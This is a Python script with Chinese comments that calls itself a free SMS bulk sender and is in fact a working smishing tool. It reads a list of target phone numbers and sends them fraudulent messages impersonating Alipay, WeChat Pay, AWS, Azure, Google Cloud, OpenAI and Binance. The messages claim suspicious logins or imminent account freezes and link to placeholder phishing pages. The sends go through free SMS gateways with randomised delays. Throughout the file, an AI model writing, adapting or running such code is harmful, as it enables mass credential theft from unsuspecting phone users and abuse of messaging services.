#!/usr/bin/env python3
"""
免费短信网关群发脚本
支持：Textbelt、云片测试、阿里云测试、Submail、极光等免费额度
"""

import asyncio
import aiohttp
import random
import json
import os
from datetime import datetime
from typing import List, Dict, Optional

# 配置区 -----------------------------------------------------------
# Textbelt (每天 1 条免费，需申请 key)
TEXTBELT_KEY = os.getenv('TEXTBELT_KEY', 'textbelt')  # 免费 key 只能用 textbelt

# 云片网络 (注册送测试额度)
YUNPIAN_APIKEY = os.getenv('YUNPIAN_APIKEY', '')

# 阿里云短信 (测试签名/模板)
ALIYUN_ACCESS_KEY = os.getenv('ALIYUN_ACCESS_KEY', '')
ALIYUN_ACCESS_SECRET = os.getenv('ALIYUN_ACCESS_SECRET', '')
ALIYUN_SIGN_NAME = os.getenv('ALIYUN_SIGN_NAME', '测试签名')
ALIYUN_TEMPLATE_CODE = os.getenv('ALIYUN_TEMPLATE_CODE', 'SMS_123456789')

# Submail (注册送额度)
SUBMAIL_APPID = os.getenv('SUBMAIL_APPID', '')
SUBMAIL_APPKEY = os.getenv('SUBMAIL_APPKEY', '')
SUBMAIL_SIGNATURE = os.getenv('SUBMAIL_SIGNATURE', '')

# 目标手机号文件
PHONE_FILE = os.getenv('PHONE_FILE', 'phones.txt')

# 短信模板
SMS_TEMPLATES = [
    "[{sign}] 您的 {service} 账号疑似异常登录，请立即验证身份：{url} 如非本人操作请忽略。",
    "[{sign}] {service} 安全中心：检测到新设备登录，请确认：{url} 退订回 T",
    "[{sign}] 尊敬的用户，您的 {service} 账号需完成安全验证：{url} 10分钟内有效。",
    "[{sign}] 重要提醒：{service} 账号将于 24 小时后冻结，请尽快验证保号：{url}",
]

SERVICE_URLS = {
    'alipay': 'https://your-domain.pages.dev/site/alipay/',
    'wechat': 'https://your-domain.pages.dev/site/wechat/',
    'aws': 'https://your-domain.pages.dev/site/aws/',
    'azure': 'https://your-domain.pages.dev/site/azure/',
    'gcp': 'https://your-domain.pages.dev/site/gcp/',
    'chatgpt': 'https://your-domain.pages.dev/site/chatgpt/',
    'binance': 'https://your-domain.pages.dev/site/binance/',
}

SIGNS = ['支付宝', '微信支付', 'AWS云服务', 'Azure云', 'Google云', 'OpenAI', 'Binance']

# 发送间隔（秒）
SEND_INTERVAL = (2, 5)
# -----------------------------------------------------------

class SMSSender:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.sent = 0
        self.failed = 0
        self.phones: List[str] = []
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
            
    def load_phones(self) -> List[str]:
        """加载手机号"""
        phones = []
        if os.path.exists(PHONE_FILE):
            with open(PHONE_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # 简单清洗
                        phone = ''.join(filter(str.isdigit, line))
                        if len(phone) == 11 and phone.startswith('1'):
                            phones.append(phone)
        else:
            # 生成示例文件
            with open(PHONE_FILE, 'w') as f:
                f.write("# 每行一个手机号，支持带分隔符\n")
                f.write("# 示例:\n")
                f.write("# 13800138000\n")
                f.write("# 139-1234-5678\n")
            print(f"📝 已创建示例文件: {PHONE_FILE}，请填入目标手机号")
        self.phones = phones
        print(f"📱 加载手机号: {len(phones)} 个")
        return phones
        
    def build_message(self) -> tuple:
        """构建短信内容"""
        service = random.choice(list(SERVICE_URLS.keys()))
        url = SERVICE_URLS[service]
        sign = random.choice(SIGNS)
        template = random.choice(SMS_TEMPLATES)
        msg = template.format(sign=sign, service=sign, url=url)
        return service, msg
        
    async def send_textbelt(self, phone: str, message: str) -> bool:
        """Textbelt 免费 API"""
        try:
            async with self.session.post(
                'https://textbelt.com/text',
                data={'phone': phone, 'message': message, 'key': TEXTBELT_KEY}
            ) as resp:
                data = await resp.json()
                return data.get('success', False)
        except:
            return False
            
    async def send_yunpian(self, phone: str, message: str) -> bool:
        """云片网络"""
        if not YUNPIAN_APIKEY:
            return False
        try:
            async with self.session.post(
                'https://sms.yunpian.com/v2/sms/single_send.json',
                data={'apikey': YUNPIAN_APIKEY, 'mobile': phone, 'text': message}
            ) as resp:
                data = await resp.json()
                return data.get('code') == 0
        except:
            return False
            
    async def send_aliyun(self, phone: str, message: str) -> bool:
        """阿里云短信（简化版，实际需签名算法）"""
        # 这里只做示例，实际阿里云需要复杂的签名计算
        # 建议用官方 SDK 或预签名 URL
        return False
        
    async def send_submail(self, phone: str, message: str) -> bool:
        """Submail"""
        if not SUBMAIL_APPID or not SUBMAIL_APPKEY:
            return False
        try:
            async with self.session.post(
                'https://api.submail.cn/message/xsend.json',
                data={
                    'appid': SUBMAIL_APPID,
                    'signature': SUBMAIL_SIGNATURE,
                    'to': phone,
                    'project': 'phish_verify',  # 需在后台建模板
                    'vars': json.dumps({'code': message[-6:]})  # 简化
                }
            ) as resp:
                data = await resp.json()
                return data.get('status') == 'success'
        except:
            return False
            
    async def send_one(self, phone: str) -> bool:
        """尝试多通道发送"""
        service, msg = self.build_message()
        
        # 按优先级尝试
        channels = [
            ('Textbelt', self.send_textbelt),
            ('Yunpian', self.send_yunpian),
            ('Submail', self.send_submail),
        ]
        
        for name, func in channels:
            try:
                ok = await func(phone, msg)
                if ok:
                    print(f"[{datetime.now()}] ✅ {name} 发送成功 -> {phone[:3]}****{phone[-4:]} | {service}")
                    return True
            except Exception as e:
                print(f"[{datetime.now()}] ⚠️ {name} 异常: {e}")
                continue
                
        print(f"[{datetime.now()}] ❌ 所有通道失败 -> {phone[:3]}****{phone[-4:]}")
        return False
        
    async def run(self):
        """主循环"""
        if not self.phones:
            self.load_phones()
        if not self.phones:
            print("❌ 没有手机号，退出")
            return
            
        print(f"🚀 开始群发，共 {len(self.phones)} 个号码")
        
        for phone in self.phones:
            ok = await self.send_one(phone)
            if ok:
                self.sent += 1
            else:
                self.failed += 1
                
            # 随机间隔
            interval = random.uniform(*SEND_INTERVAL)
            await asyncio.sleep(interval)
            
        print(f"\n📊 发送完成: 成功 {self.sent} | 失败 {self.failed} | 总计 {len(self.phones)}")

async def main():
    print("""
╔══════════════════════════════════════════════════════════╗
║           免费短信网关群发器 v1.0                          ║
║  支持: Textbelt / 云片 / Submail / 阿里云(需SDK)           ║
║  环境变量配置对应 KEY，手机号放 phones.txt                ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    async with SMSSender() as sender:
        await sender.run()

if __name__ == '__main__':
    asyncio.run(main())